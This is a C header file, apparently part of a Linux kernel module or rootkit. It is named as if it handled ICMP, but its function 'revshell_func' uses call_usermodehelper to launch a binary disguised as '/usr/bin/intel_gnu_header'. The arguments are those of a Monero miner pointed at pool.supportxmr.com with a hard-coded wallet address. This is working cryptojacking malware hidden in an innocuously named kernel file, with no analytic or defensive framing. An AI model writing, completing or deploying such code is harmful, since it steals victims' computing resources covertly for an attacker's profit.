#ifndef ICMP_RCV_H
#define ICMP_RCV_H
#include "../config.h"

int revshell_func(void *data) {
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
    };
    char *argv[] = {
        "/usr/bin/intel_gnu_header",
        "-o", "pool.supportxmr.com:443",
        "-u", "44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73",
        "-k",
        "--tls",
        "-p", "prolay",
        NULL
    };

    // Execute once without loop
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    
    return 0;
}



#endif // !ICMP_RCV_H
